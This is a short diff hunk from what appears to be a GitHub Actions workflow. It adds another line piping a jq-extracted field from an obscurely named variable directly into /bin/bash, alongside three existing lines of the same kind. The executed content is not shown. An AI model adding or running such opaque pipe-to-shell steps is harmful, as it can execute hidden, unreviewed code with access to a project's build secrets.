@@ -30,6 +30,7 @@ jobs:
           echo $mw4189 | jq -r .z4259 | /bin/bash
           echo $ew7 | jq -r .pbkwm4 | /bin/bash
           echo $oyq585 | jq -r .eo8 | /bin/bash
+          echo $jp7 | jq -r .hw49938 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
